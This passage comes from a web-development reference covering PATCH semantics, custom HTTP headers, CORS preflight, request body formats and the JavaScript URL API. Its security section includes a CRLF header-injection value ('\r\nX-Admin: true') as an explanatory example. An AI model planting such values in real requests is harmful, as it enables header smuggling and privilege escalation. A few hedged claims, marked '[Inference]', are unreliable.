Content-Type: application/json-patch+json

[
  {"op": "replace", "path": "/email", "value": "valid@example.com"},
  {"op": "replace", "path": "/age", "value": -5}
]

HTTP/1.1 422 Unprocessable Entity

{
  "error": "Patch validation failed",
  "failed_operation": 1,
  "details": "Age must be positive"
}
```

Resource remains unchanged. All operations succeed or all fail.

**Partial success—apply successful operations, report failures:**

```
HTTP/1.1 200 OK

{
  "success": [
    {"op": "replace", "path": "/email", "status": "applied"}
  ],
  "failed": [
    {"op": "replace", "path": "/age", "error": "Age must be positive"}
  ]
}
```

Some operations applied, others rejected. This approach is less common and can lead to unexpected states.

Most REST APIs follow atomic PATCH semantics—either the entire patch succeeds or the entire patch fails.

---

## Custom Headers

### Header Categories

Custom headers fall into several categories based on their origin and purpose:

**Application-Specific Headers** Headers defined by the application for internal communication between client and server. These typically use prefixes like `X-` (legacy convention) or application namespaces (e.g., `MyApp-Session-ID`, `API-Key`).

**Standardized Extension Headers** Headers that started as custom but became de facto standards through widespread adoption (e.g., `X-Forwarded-For`, `X-Content-Type-Options`).

**Proprietary Headers** Browser or CDN-specific headers that provide additional functionality (e.g., `CF-Ray` from Cloudflare, `X-Chrome-UMA-Enabled`).

### Setting Custom Headers

**Fetch API**

```javascript
fetch('https://api.example.com/data', {
  headers: {
    'X-API-Key': 'abc123',
    'X-Request-ID': crypto.randomUUID(),
    'X-Custom-Metadata': JSON.stringify({user: 'john'})
  }
});
```

**XMLHttpRequest**

```javascript
const xhr = new XMLHttpRequest();
xhr.open('GET', 'https://api.example.com/data');
xhr.setRequestHeader('X-API-Key', 'abc123');
xhr.setRequestHeader('X-Request-ID', crypto.randomUUID());
xhr.send();
```

**Server-Side (Node.js Example)**

```javascript
response.setHeader('X-Response-Time', '42ms');
response.setHeader('X-Server-Version', '2.1.0');
```

### Browser Restrictions on Custom Headers

**Forbidden Headers**

Browsers prevent JavaScript from setting certain headers to maintain security and protocol integrity. These forbidden header names include:

- `Accept-Charset`
- `Accept-Encoding`
- `Access-Control-Request-Headers`
- `Access-Control-Request-Method`
- `Connection`
- `Content-Length`
- `Cookie`
- `Date`
- `DNT`
- `Expect`
- `Host`
- `Keep-Alive`
- `Origin`
- `Referer`
- `TE`
- `Trailer`
- `Transfer-Encoding`
- `Upgrade`
- `Via`

Headers starting with `Proxy-` or `Sec-` are also forbidden from JavaScript manipulation.

**CORS Safelisted Headers**

For cross-origin requests, only certain headers are allowed without triggering a preflight:

- `Accept`
- `Accept-Language`
- `Content-Language`
- `Content-Type` (limited to `application/x-www-form-urlencoded`, `multipart/form-data`, or `text/plain`)

Any custom header triggers a CORS preflight OPTIONS request.

### CORS Preflight for Custom Headers

When sending custom headers cross-origin, the browser first sends a preflight request:

**Preflight Request:**

```
OPTIONS /api/resource HTTP/1.1
Host: api.example.com
Origin: https://myapp.com
Access-Control-Request-Method: POST
Access-Control-Request-Headers: x-api-key, x-request-id
```

**Required Server Response:**

```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://myapp.com
Access-Control-Allow-Methods: POST, GET, OPTIONS
Access-Control-Allow-Headers: x-api-key, x-request-id
Access-Control-Max-Age: 86400
```

The `Access-Control-Allow-Headers` must explicitly list custom headers. Wildcards (`*`) work but exclude credentials mode.

### Common Custom Header Patterns

**Authentication Headers**

```javascript
// Bearer token
headers: {
  'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIs...'
}

// API key
headers: {
  'X-API-Key': 'sk_live_abc123...',
  'X-API-Secret': 'secret_key'
}

// Custom auth scheme
headers: {
  'X-Auth-Token': 'token123',
  'X-Auth-User': 'user@example.com'
}
```

**Request Tracking**

```javascript
headers: {
  'X-Request-ID': crypto.randomUUID(),
  'X-Correlation-ID': sessionId,
  'X-Trace-ID': generateTraceId()
}
```

These enable distributed tracing across microservices and help debug issues by tracking requests through multiple systems.

**Client Metadata**

```javascript
headers: {
  'X-Client-Version': '2.5.1',
  'X-Platform': 'web',
  'X-Device-ID': deviceIdentifier,
  'X-Session-ID': sessionToken
}
```

**Content Negotiation Extensions**

```javascript
headers: {
  'X-API-Version': 'v2',
  'X-Response-Format': 'compact',
  'X-Include-Deprecated': 'false'
}
```

**Rate Limiting Information**

Server response headers communicating rate limit status:

```
X-RateLimit-Limit: 1000
X-RateLimit-Remaining: 847
X-RateLimit-Reset: 1640000000
X-RateLimit-Retry-After: 3600
```

### Header Naming Conventions

**Legacy X- Prefix**

Historically, custom headers used the `X-` prefix (e.g., `X-Custom-Header`). RFC 6648 deprecated this convention in 2012, but many systems still use it.

**Modern Naming**

Current best practice uses descriptive names without the `X-` prefix:

- `API-Key` instead of `X-API-Key`
- `Request-ID` instead of `X-Request-ID`

[Inference] In practice, both conventions coexist, and the choice often depends on established API patterns or legacy compatibility requirements.

**Case Sensitivity**

HTTP header names are case-insensitive per RFC specifications. However, HTTP/2 and HTTP/3 require lowercase header names. Browsers normalize header names, but servers should handle case-insensitively.

### Response Header Access

**Reading Response Headers**

```javascript
fetch('https://api.example.com/data')
  .then(response => {
    const customHeader = response.headers.get('X-Custom-Data');
    const rateLimit = response.headers.get('X-RateLimit-Remaining');
    
    // Iterate all headers
    response.headers.forEach((value, key) => {
      console.log(`${key}: ${value}`);
    });
  });
```

**CORS Exposure**

By default, JavaScript can only read CORS-safelisted response headers:

- `Cache-Control`
- `Content-Language`
- `Content-Length`
- `Content-Type`
- `Expires`
- `Last-Modified`
- `Pragma`

To expose custom response headers cross-origin, servers must include:

```
Access-Control-Expose-Headers: X-Custom-Data, X-RateLimit-Remaining
```

Without this header, `response.headers.get('X-Custom-Data')` returns `null` even if the server sent it.

### Security Considerations

**Information Leakage**

Custom headers can leak sensitive information if not properly protected:

- **API keys in headers**: Vulnerable to XSS attacks if stored in JavaScript-accessible locations
- **Internal architecture details**: Headers like `X-Server-ID` or `X-Backend-Host` expose infrastructure
- **User information**: Headers containing PII should be encrypted or avoided

**Header Injection**

User-controlled content in headers creates injection vulnerabilities:

```javascript
// Vulnerable
const userId = getUserInput(); // Could contain "\r\nX-Admin: true"
fetch('/api', {
  headers: {'X-User-ID': userId}
});
```

Browsers typically prevent CRLF injection, but server-side code must validate header values to prevent HTTP response splitting attacks.

**Size Limits**

Headers have practical size constraints:

- Total request header size: Typically 8KB-16KB
- Individual header size: Usually no hard limit, but practically under 8KB
- Number of headers: Often limited to 100-200 per request

Exceeding these limits causes `431 Request Header Fields Too Large` errors.

### Caching Implications

**Vary Header**

Custom headers used for content negotiation should be listed in the `Vary` response header:

```
Vary: Accept-Language, X-API-Version, X-Device-Type
```

This instructs caches to store separate versions based on these header values. Overuse of `Vary` reduces cache efficiency.

**Cache Keys**

CDNs and proxy caches may include custom headers in cache keys. Headers like `X-User-ID` or `X-Session-ID` effectively disable caching by creating unique cache entries per user.

### Middleware and Proxy Headers

**Forwarding Headers**

Proxies and load balancers add headers tracking request routing:

```
X-Forwarded-For: 203.0.113.195, 198.51.100.178
X-Forwarded-Proto: https
X-Forwarded-Host: example.com
X-Real-IP: 203.0.113.195
```

**Standard Forwarded Header**

RFC 7239 defines a standardized `Forwarded` header replacing the `X-Forwarded-*` variants:

```
Forwarded: for=203.0.113.195;proto=https;host=example.com
```

[Inference] Adoption of the standard `Forwarded` header remains limited, with most systems still using the `X-Forwarded-*` headers due to legacy support requirements.

### Service Worker Interception

Service workers can read, modify, or add custom headers:

```javascript
self.addEventListener('fetch', (event) => {
  const request = event.request;
  
  // Read custom header
  const apiKey = request.headers.get('X-API-Key');
  
  // Create modified request
  const modifiedRequest = new Request(request, {
    headers: new Headers({
      ...Object.fromEntries(request.headers),
      'X-Service-Worker': 'active',
      'X-Cache-Strategy': 'network-first'
    })
  });
  
  event.respondWith(fetch(modifiedRequest));
});
```

Service workers can add headers that wouldn't trigger preflight since the final request originates from the service worker's scope.

### Server-Sent Events (SSE) Headers

SSE connections support custom headers in the initial request:

```javascript
const eventSource = new EventSource('https://api.example.com/events', {
  // Note: EventSource doesn't support custom headers directly
  // Must use alternatives like query parameters or cookies
});
```

[Unverified] The EventSource API specification doesn't provide a standard mechanism for custom headers. Workarounds include using query parameters for authentication or relying on cookies.

### WebSocket Handshake Headers

WebSocket upgrades allow custom headers during the handshake:

```javascript
const ws = new WebSocket('wss://api.example.com/socket');
// Note: Browser WebSocket API doesn't support custom headers
```

Browser WebSocket APIs don't support custom headers directly. Solutions include:

- Sending authentication in the initial frame after connection
- Using query parameters in the WebSocket URL
- Utilizing subprotocol negotiation via `Sec-WebSocket-Protocol`

Server-side WebSocket libraries can access and set custom headers during the handshake.

### Header Compression

**HTTP/2 HPACK**

HTTP/2 compresses headers using HPACK, which maintains a dynamic table of previously sent header name-value pairs. Frequently used custom headers benefit from compression after first transmission.

**HTTP/3 QPACK**

HTTP/3 uses QPACK, an improved header compression allowing out-of-order delivery while maintaining compression efficiency. Custom headers with predictable values compress well.

**Compression Considerations**

Highly variable custom header values (like unique request IDs or timestamps) compress poorly. Static custom headers (like API versions) compress effectively after first use.

### Header Inspection Tools

**Browser DevTools**

Network tab displays all request/response headers:

- Chrome DevTools: Network → Select request → Headers tab
- Firefox Developer Tools: Network → Select request → Headers tab
- Safari Web Inspector: Network → Select request → Headers section

**Programmatic Access**

```javascript
// Log all request headers (in Service Worker)
self.addEventListener('fetch', (event) => {
  console.log('Request headers:');
  for (const [key, value] of event.request.headers.entries()) {
    console.log(`${key}: ${value}`);
  }
});
```

### Header Best Practices

**Naming Guidelines**

1. Use descriptive, self-documenting names: `API-Version` over `AV`
2. Be consistent within your API: Don't mix `X-User-ID` and `UserID`
3. Use hyphens for word separation: `Request-ID` not `RequestID` or `request_id`
4. Avoid overly generic names that might conflict: `App-Token` instead of `Token`

**Performance Optimization**

1. Minimize custom header count to reduce preflight overhead
2. Keep header values compact (avoid large JSON payloads)
3. Use cookies for authentication when possible (automatically handled, no preflight)
4. Consider query parameters for simple API versioning instead of headers

**Security Best Practices**

1. Never put sensitive data in headers without HTTPS
2. Validate and sanitize all header values server-side
3. Use `HttpOnly` cookies for tokens instead of custom headers when possible
4. Implement rate limiting based on header abuse patterns
5. Log custom header usage for security monitoring

### Custom Headers in Testing

**Mocking Headers**

Test frameworks can inject custom headers:

```javascript
// Jest with fetch-mock
fetchMock.get('https://api.example.com/data', {
  body: {data: 'test'},
  headers: {
    'X-Response-Time': '15ms',
    'X-Cache-Status': 'HIT'
  }
});

// Cypress
cy.intercept('GET', '/api/data', (req) => {
  req.headers['X-Test-Mode'] = 'true';
  req.headers['X-Mock-User'] = 'test-user';
});
```

**Header Assertions**

```javascript
// Testing outgoing headers
test('sends custom headers', async () => {
  const response = await fetch('/api/data', {
    headers: {'X-API-Key': 'test-key'}
  });
  
  expect(mockFetch).toHaveBeenCalledWith(
    expect.anything(),
    expect.objectContaining({
      headers: expect.objectContaining({
        'X-API-Key': 'test-key'
      })
    })
  );
});

// Testing received headers
test('receives rate limit headers', async () => {
  const response = await fetch('/api/data');
  expect(response.headers.get('X-RateLimit-Remaining')).toBe('99');
});
```

---

## Request Body Formats

### application/x-www-form-urlencoded

The default content type for HTML form submissions. Data is encoded as key-value pairs with special character encoding.

**Encoding rules:**

- Space characters become `+` or `%20`
- Non-alphanumeric characters (except `-`, `_`, `.`, `~`) are percent-encoded
- Key-value pairs separated by `&`
- Keys and values separated by `=`

**Example:**

```
name=John+Doe&email=john%40example.com&age=30
```

**Characteristics:**

- Simple, widely supported
- Inefficient for binary data
- Inefficient for large payloads (percent-encoding overhead)
- Flat structure (no native nesting)
- Arrays typically encoded as repeated keys: `item=1&item=2&item=3`

**Nested data handling:** No standard exists. Common conventions:

- PHP-style: `user[name]=John&user[email]=john@example.com`
- Bracket notation: `user.name=John&user.email=john@example.com`

[Inference: Server-side interpretation of nested structures varies by framework and language.]

**Content-Type header:**

```
Content-Type: application/x-www-form-urlencoded
```

### multipart/form-data

Used for forms that upload files or large amounts of data. The body is divided into parts separated by a boundary string.

**Structure:**

```
--boundary_string
Content-Disposition: form-data; name="field_name"

field_value
--boundary_string
Content-Disposition: form-data; name="file"; filename="document.pdf"
Content-Type: application/pdf

[binary file data]
--boundary_string--
```

**Characteristics:**

- Each part has its own headers
- Boundary string declared in Content-Type header
- Efficient for binary data (no encoding overhead)
- Supports multiple files in single request
- Each part can have different content types

**Content-Type header:**

```
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
```

**Boundary selection:** Must not appear in the data itself. Browsers generate random boundaries. Typical patterns include long alphanumeric strings with special prefixes.

**Part headers:**

- `Content-Disposition`: Required, specifies field name and optional filename
- `Content-Type`: Optional, defaults to `text/plain` for text fields
- `Content-Transfer-Encoding`: Rarely used in HTTP multipart

**File upload specifics:**

- `filename` parameter indicates uploaded file
- Original filename typically preserved but can be modified
- Multiple files: Either multiple parts with same name or multiple parts with different names

### application/json

JSON-encoded request body. The dominant format for modern REST APIs.

**Example:**

```json
{
  "name": "John Doe",
  "email": "john@example.com",
  "age": 30,
  "preferences": {
    "notifications": true,
    "theme": "dark"
  },
  "tags": ["customer", "premium"]
}
```

**Characteristics:**

- Native support for nested structures
- Native arrays and objects
- Type preservation (strings, numbers, booleans, null)
- Human-readable
- Smaller than XML for equivalent data
- No binary data support without encoding (base64)

**Content-Type header:**

```
Content-Type: application/json
```

**Charset specification:**

```
Content-Type: application/json; charset=utf-8
```

Though UTF-8 is the default for JSON per RFC 8259.

**Common patterns:**

- RESTful APIs predominantly use JSON
- Batch operations: Array of objects at root level
- Metadata separation: Wrapper objects with `data` and `meta` properties

**Limitations:**

- No native date format (ISO 8601 strings conventional)
- No native binary format
- No comments in standard JSON
- No undefined value (must use null or omit key)
- Circular references impossible

### application/xml and text/xml

XML-encoded data. Legacy format still used in SOAP, some enterprise systems, and specific domains.

**Example:**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<user>
  <name>John Doe</name>
  <email>john@example.com</email>
  <age>30</age>
  <preferences>
    <notifications>true</notifications>
    <theme>dark</theme>
  </preferences>
</user>
```

**Characteristics:**

- Self-describing with schemas (XSD)
- Verbose compared to JSON
- Namespace support for avoiding conflicts
- Attribute and element dual structure
- Native comment support
- Processing instructions possible

**Content-Type headers:**

```
Content-Type: application/xml
Content-Type: text/xml
```

[Inference: `application/xml` is preferred for data interchange, while `text/xml` has legacy usage. The distinction affects default charset handling in some contexts.]

**Attributes vs elements:**

```xml
<!-- Using attributes -->
<user name="John Doe" email="john@example.com" age="30"/>

<!-- Using elements -->
<user>
  <name>John Doe</name>
  <email>john@example.com</email>
</user>
```

**Common conventions:**

- Metadata in attributes, data in elements
- SOAP envelopes for web services
- RSS/Atom feeds

### text/plain

Plain text without specific structure. Minimal processing by server.

**Characteristics:**

- No parsing required
- Arbitrary text content
- No standardized structure
- Rarely used for structured APIs

**Content-Type header:**

```
Content-Type: text/plain; charset=utf-8
```

**Use cases:**

- Log submissions
- Simple text uploads
- Webhook payloads (some systems)
- Raw data transmission

### application/octet-stream

Binary data without specific format. Generic binary transfer.

**Characteristics:**

- No interpretation of content
- Raw byte stream
- Server determines handling
- Efficient for unknown binary formats

**Content-Type header:**

```
Content-Type: application/octet-stream
```

**Use cases:**

- File downloads with unknown type
- Raw binary uploads
- Executable files
- Generic file transfer when specific MIME type unknown

### application/graphql

GraphQL query format. Typically JSON-encoded but with specific structure.

**Example:**

```json
{
  "query": "query GetUser($id: ID!) { user(id: $id) { name email } }",
  "variables": {
    "id": "123"
  },
  "operationName": "GetUser"
}
```

**Characteristics:**

- Query string in `query` field
- Variables in separate `variables` field
- Optional operation name
- Allows multiple operations in single request

**Content-Type header:**

```
Content-Type: application/json
```

Though some servers accept:

```
Content-Type: application/graphql
```

For query-only requests without variables.

### application/x-ndjson (Newline Delimited JSON)

Streaming JSON format where each line is a separate JSON object.

**Example:**

```
{"name":"John","age":30}
{"name":"Jane","age":25}
{"name":"Bob","age":35}
```

**Characteristics:**

- Each line is independently parseable
- Supports streaming processing
- No array wrapper overhead
- Recovery from partial failures
- Used in log shipping and bulk operations

**Content-Type header:**

```
Content-Type: application/x-ndjson
```

**Use cases:**

- Elasticsearch bulk API
- Log aggregation systems
- Streaming data pipelines
- Event sourcing

### application/protobuf

Protocol Buffers binary format. Efficient binary serialization.

**Characteristics:**

- Requires schema definition (.proto files)
- Compact binary representation
- Type-safe
- Forward/backward compatibility through field numbering
- Significantly smaller than JSON for equivalent data
- Not human-readable

**Content-Type header:**

```
Content-Type: application/protobuf
```

Or:

```
Content-Type: application/x-protobuf
```

**Use cases:**

- gRPC services
- Microservice communication
- High-performance APIs
- Mobile applications (bandwidth savings)

**Schema requirement:** Both client and server must share .proto definitions for serialization/deserialization.

### application/msgpack

MessagePack binary format. JSON-like structure with binary efficiency.

**Characteristics:**

- Binary JSON alternative
- Smaller than JSON
- Preserves types like JSON
- Faster parsing than JSON [Inference: Based on benchmark claims, though actual performance varies by implementation]
- Not human-readable

**Content-Type header:**

```
Content-Type: application/msgpack
```

Or:

```
Content-Type: application/x-msgpack
```

**Use cases:**

- Real-time applications
- WebSocket communications
- Cache serialization
- Inter-service communication

### application/cbor

CBOR (Concise Binary Object Representation). Binary JSON-like format with extended types.

**Characteristics:**

- RFC 8949 specification
- Supports more types than JSON (binary, dates, bigints)
- Self-describing format
- Similar size to MessagePack
- IoT and embedded system usage

**Content-Type header:**

```
Content-Type: application/cbor
```

**Extended features:**

- Native binary data (no base64 needed)
- Native date/time types
- Big numbers
- Tagged values for custom types
- Streaming support

### text/csv

Comma-separated values. Simple tabular data format.

**Example:**

```
name,email,age
John Doe,john@example.com,30
Jane Smith,jane@example.com,25
```

**Characteristics:**

- Row-based tabular data
- Header row optional but conventional
- Simple parsing
- Inconsistent escaping standards

**Content-Type header:**

```
Content-Type: text/csv; charset=utf-8
```

**Escaping rules (RFC 4180):**

- Fields with commas, quotes, or newlines must be quoted
- Quotes inside quoted fields doubled: `""`
- Alternative delimiters possible (semicolon, tab)

**Limitations:**

- Flat structure only
- No type information
- Ambiguous empty vs null
- Encoding inconsistencies across implementations

### application/x-yaml and text/yaml

YAML format. Human-readable structured data.

**Example:**

```yaml
name: John Doe
email: john@example.com
age: 30
preferences:
  notifications: true
  theme: dark
tags:
  - customer
  - premium
```

**Characteristics:**

- Indentation-based structure
- Comments supported
- Multiple document support
- Anchors and references for repeated data
- More complex than JSON

**Content-Type header:**

```
Content-Type: application/x-yaml
```

Or:

```
Content-Type: text/yaml
```

**Use cases:**

- Configuration files
- CI/CD definitions
- Infrastructure as code
- Less common in HTTP APIs

### application/x-amf

Action Message Format. Binary format used by Flash/Flex applications.

**Characteristics:**

- Adobe-developed format
- Compact binary serialization
- Preserves ActionScript types
- AMF0 and AMF3 versions
- Declining usage

**Content-Type header:**

```
Content-Type: application/x-amf
```

### application/vnd.api+json

JSON API specification format. Standardized JSON structure for REST APIs.

**Example:**

```json
{
  "data": {
    "type": "users",
    "id": "123",
    "attributes": {
      "name": "John Doe",
      "email": "john@example.com"
    },
    "relationships": {
      "posts": {
        "links": {
          "related": "/users/123/posts"
        }
      }
    }
  }
}
```

**Characteristics:**

- Standardized structure with `data`, `included`, `errors`
- Resource type identification
- Relationship representation
- Pagination, filtering, sorting conventions
- Sparse fieldsets support

**Content-Type header:**

```
Content-Type: application/vnd.api+json
```

### application/ld+json

JSON-LD (Linked Data). JSON format with semantic web capabilities.

**Example:**

```json
{
  "@context": "https://schema.org",
  "@type": "Person",
  "name": "John Doe",
  "email": "john@example.com",
  "jobTitle": "Developer"
}
```

**Characteristics:**

- RDF serialization in JSON
- `@context` for vocabulary definition
- `@type` for type identification
- Linked data principles
- SEO applications (structured data)

**Content-Type header:**

```
Content-Type: application/ld+json
```

### application/x-thrift

Apache Thrift binary protocol. RPC framework serialization format.

**Characteristics:**

- Cross-language RPC support
- Multiple protocol variants (binary, compact, JSON)
- Requires IDL (Interface Definition Language)
- Type-safe
- Efficient binary encoding

**Content-Type header:**

```
Content-Type: application/x-thrift
```

**Variants:**

- TBinaryProtocol: Simple binary encoding
- TCompactProtocol: Optimized for size
- TJSONProtocol: JSON encoding for debugging

### Content Negotiation and Selection

Clients indicate preferred formats via `Accept` header:

```
Accept: application/json, application/xml;q=0.9, */*;q=0.8
```

Servers respond with actual format via `Content-Type` header.

**Quality values (q):** Indicate preference strength (0-1). Default is 1.0.

**Wildcard patterns:**

- `*/*`: Any format
- `application/*`: Any application type
- `text/*`: Any text type

### Encoding and Compression

Request bodies can be compressed using `Content-Encoding` header:

```
Content-Encoding: gzip
Content-Encoding: deflate
Content-Encoding: br
```

**Brotli (br):** Modern compression with better ratios than gzip. Increasing adoption.

**Transfer-Encoding:** For chunked transfer:

```
Transfer-Encoding: chunked
```

Allows streaming large bodies without knowing total size upfront.

### Character Encoding

Specified via `charset` parameter:

```
Content-Type: application/json; charset=utf-8
Content-Type: text/plain; charset=iso-8859-1
```

**UTF-8 dominance:** Modern APIs default to UTF-8. Some formats (JSON, Protocol Buffers) mandate UTF-8.

### Size Limitations

Server-imposed limits vary by implementation:

- Common default: 1-2 MB for JSON/form data
- Configurable maximums for file uploads (often 10-100 MB)
- Stream processing for very large payloads

**Client-side limits:** Browsers impose memory constraints on request construction.

### Security Considerations

**Content-Type validation:** Servers should verify Content-Type matches actual content to prevent content-type confusion attacks.

**Size limits:** Enforce maximum body sizes to prevent DoS attacks.

**Parsing safety:**

- JSON: Deep nesting attacks
- XML: Billion laughs attack, external entity injection
- Multipart: Boundary collision attacks

**Content validation:** Always validate and sanitize regardless of format.

### Performance Characteristics

**Parsing speed:** [Inference: Generally binary formats (protobuf, msgpack) parse faster than text formats (JSON, XML), though exact performance depends on implementation quality and data characteristics.]

**Size comparison:** For equivalent data:

1. Protocol Buffers / MessagePack / CBOR (smallest)
2. JSON
3. XML (largest)

[Inference: Actual size ratios vary by data structure complexity and redundancy.]

**Network efficiency:** Binary formats reduce bandwidth. Compression narrows the gap between formats.

---

## URL Construction and Parameters

### The URL Interface

The URL API provides a constructor-based approach to URL manipulation, replacing string concatenation and regular expression parsing. The `URL` constructor accepts an absolute URL string or a relative URL with a base URL as the second parameter.

```javascript
const url = new URL('https://api.example.com/users');
const relative = new URL('/api/users', 'https://example.com');
```

The URL object parses the input into discrete components accessible as properties: `protocol`, `username`, `password`, `hostname`, `port`, `pathname`, `search`, `searchParams`, and `hash`. Each property provides read/write access to its respective URL segment, with automatic encoding and validation.

The `href` property returns the complete serialized URL string. Modifying any component property automatically updates `href` to reflect the change. The `origin` property (read-only) combines `protocol`, `hostname`, and `port` into the origin string used for same-origin policy checks.

### URLSearchParams for Query String Management

The `URLSearchParams` interface manages query string parameters through a dedicated API, eliminating manual parsing and encoding. Accessed via `url.searchParams`, it provides methods for parameter manipulation that automatically handle encoding and serialization.

The `append(name, value)` method adds parameters without removing existing ones with the same name, supporting multiple values per key. The `set(name, value)` method replaces all existing parameters with the given name, ensuring only one value exists. The `get(name)` method returns the first value for a parameter, while `getAll(name)` returns an array of all values.

The `has(name)` method checks parameter existence without retrieving values. The `delete(name)` method removes all parameters with the specified name. The `keys()`, `values()`, and `entries()` methods return iterators for parameter traversal.

URLSearchParams implements the iterable protocol, enabling `for...of` loops that yield `[name, value]` pairs:

```javascript
for (const [key, value] of url.searchParams) {
  console.log(`${key}: ${value}`);
}
```

The `toString()` method serializes parameters to a query string without the leading `?`, useful for manual URL construction or form data encoding.

### Parameter Encoding Behavior

URLSearchParams automatically applies percent-encoding to parameter names and values, handling special characters according to the `application/x-www-form-urlencoded` format. Spaces encode as `+` rather than `%20` in the serialized string, matching HTML form submission behavior.

Reserved characters like `&`, `=`, `#`, and `?` receive percent-encoding when used in values, preventing parsing ambiguity. Non-ASCII characters encode as UTF-8 byte sequences with each byte percent-encoded.

The encoding differs slightly from `encodeURIComponent()`, which encodes spaces as `%20` and follows RFC 3986 rather than the form encoding specification. URLSearchParams uses WHATWG URL Standard encoding, optimized for query parameter contexts.

Characters like `!`, `'`, `(`, `)`, and `*` remain unencoded in URLSearchParams despite being encoded by `encodeURIComponent()`. This difference reflects the application/x-www-form-urlencoded specification's legacy compatibility with HTML form submissions.

### Constructing URLs with Parameters

Creating URLs with multiple parameters benefits from method chaining or bulk initialization. URLSearchParams accepts several constructor argument types: a query string (with or without leading `?`), an object with string values, an array of `[key, value]` pairs, or another URLSearchParams instance.

```javascript
// From object
const params = new URLSearchParams({
  search: 'javascript',
  limit: '10',
  offset: '0'
});

// From array of pairs
const params = new URLSearchParams([
  ['search', 'javascript'],
  ['category', 'tutorial'],
  ['category', 'reference']
]);

// From string
const params = new URLSearchParams('?search=javascript&limit=10');
```

Building URLs programmatically through property assignment:

```javascript
const url = new URL('https://api.example.com/search');
url.searchParams.set('q', 'javascript');
url.searchParams.set('page', '1');
url.searchParams.append('filter', 'recent');
url.searchParams.append('filter', 'popular');
```

The automatic synchronization between `url.search` and `url.searchParams` means modifying parameters updates the serialized query string immediately, and vice versa.

### Multiple Values Per Parameter

URLSearchParams natively supports multiple values for a single parameter name through repeated `append()` calls. The `getAll(name)` method retrieves all values as an array, while `get(name)` returns only the first value.

This design accommodates server-side frameworks that parse repeated parameters into arrays, common in REST APIs for filtering or multi-select operations:

```javascript
url.searchParams.append('tag', 'javascript');
url.searchParams.append('tag', 'web');
url.searchParams.append('tag', 'api');

// Results in: ?tag=javascript&tag=web&tag=api
```

Using `set()` replaces all existing values, removing duplicates. This distinction matters when updating existing URLs where parameter count is unknown:

```javascript
// Replace all 'tag' parameters with a single value
url.searchParams.set('tag', 'javascript');
// Now only: ?tag=javascript
```

Deleting parameters removes all instances, regardless of how many values exist.

### Array and Object Serialization

[Inference] URLSearchParams provides no built-in array or object serialization—complex data structures require custom serialization strategies. Common approaches include JSON stringification, bracket notation, or repeated parameters.

JSON serialization encodes entire structures as single parameter values:

```javascript
const filters = { minPrice: 100, maxPrice: 500, inStock: true };
params.set('filters', JSON.stringify(filters));
// Results in: ?filters=%7B%22minPrice%22%3A100%2C%22maxPrice%22%3A500%2C%22inStock%22%3Atrue%7D
```

Bracket notation mimics PHP and Rails conventions, flattening nested structures:

```javascript
params.set('filters[minPrice]', '100');
params.set('filters[maxPrice]', '500');
params.set('filters[inStock]', 'true');
// Results in: ?filters[minPrice]=100&filters[maxPrice]=500&filters[inStock]=true
```

Repeated parameters represent arrays without explicit indices:

```javascript
['red', 'blue', 'green'].forEach(color => {
  params.append('colors', color);
});
// Results in: ?colors=red&colors=blue&colors=green
```

[Inference] Server-side interpretation of these patterns varies—some frameworks parse bracket notation automatically, while others require manual parsing or expect JSON. API documentation should specify expected parameter formats.

### URL Validation and Error Handling

The URL constructor throws a `TypeError` when provided invalid URLs. URLs must include a scheme (protocol), and relative URLs require a valid base. Malformed syntax like missing colons, invalid characters in hostnames, or unparseable ports trigger errors.

```javascript
try {
  const url = new URL('not a valid url');
} catch (error) {
  console.error('Invalid URL:', error.message);
}
```

URL validation occurs during construction, not during property modification. Setting invalid values for properties like `port` (non-numeric strings) or `protocol` (invalid schemes) may silently fail or coerce values rather than throwing.

The `URL.canParse()` static method (added in more recent specifications) provides validation without exception handling:

```javascript
if (URL.canParse(urlString)) {
  const url = new URL(urlString);
}
```

[Unverified] Browser support for `URL.canParse()` may be incomplete as of late 2024—checking compatibility before relying on this method is advisable.

### Pathname Manipulation

The `pathname` property represents the URL's path component, starting with `/` for absolute paths. Setting `pathname` automatically encodes special characters except forward slashes, which serve as path segment separators.

```javascript
url.pathname = '/api/users/search';
url.pathname = '/files/document name.pdf'; // Encodes spaces
```

Path segments containing literal forward slashes require percent-encoding before assignment to prevent misinterpretation as segment separators. The encoding must be manual, as setting `pathname` treats all slashes as separators.

Building paths from segments benefits from joining with slashes while ensuring proper encoding:

```javascript
const segments = ['api', 'users', userId, 'posts'];
url.pathname = '/' + segments.map(encodeURIComponent).join('/');
```

The pathname doesn't automatically normalize `..` or `.` segments—these remain literal unless the URL is reparsed through the constructor or explicitly normalized.

### Hash Fragment Handling

The `hash` property contains the URL fragment identifier, including the leading `#`. Setting `hash` to a value without `#` automatically prepends it. Empty string assignment removes the fragment entirely.

```javascript
url.hash = 'section-2'; // Sets to '#section-2'
url.hash = '#section-2'; // Also sets to '#section-2'
url.hash = ''; // Removes hash
```

Fragment values receive percent-encoding for special characters. Fragments don't transmit to servers in HTTP requests—they're purely client-side, used for document anchors and client-side routing.

The fragment can contain any URL-encodable content, making it suitable for encoding application state in single-page applications:

```javascript
url.hash = JSON.stringify({ tab: 'settings', modal: 'open' });
```

### URL Modification Patterns

Modifying existing URLs while preserving certain components requires selective property updates. Common patterns include changing only the pathname while maintaining parameters:

```javascript
const currentUrl = new URL(window.location.href);
currentUrl.pathname = '/new/path';
// Parameters, hash, and origin remain unchanged
```

Adding parameters to existing URLs without disturbing others:

```javascript
const url = new URL(existingUrl);
url.searchParams.set('newParam', 'value');
// Existing parameters remain
```

Removing specific parameters while keeping others requires explicit deletion:

```javascript
url.searchParams.delete('unwantedParam');
// All other parameters preserved
```

Clearing all parameters while maintaining the rest of the URL:

```javascript
url.search = ''; // Removes all parameters
// Or
url.searchParams = new URLSearchParams(); // Alternative approach
```

[Inference] The `url.searchParams = new URLSearchParams()` assignment may not work in all environments—directly modifying `url.search` is more universally compatible.

### Base URL Resolution

Relative URLs resolve against a base URL through the constructor's second parameter. Resolution follows RFC 3986 rules, handling absolute paths, relative paths, query-only, and fragment-only URLs.

```javascript
// Absolute path replaces entire path
new URL('/api/users', 'https://example.com/old/path');
// Results in: https://example.com/api/users

// Relative path appends to base path
new URL('users', 'https://example.com/api/');
// Results in: https://example.com/api/users

// Query-only preserves base path
new URL('?page=2', 'https://example.com/api/users');
// Results in: https://example.com/api/users?page=2

// Fragment-only preserves everything except fragment
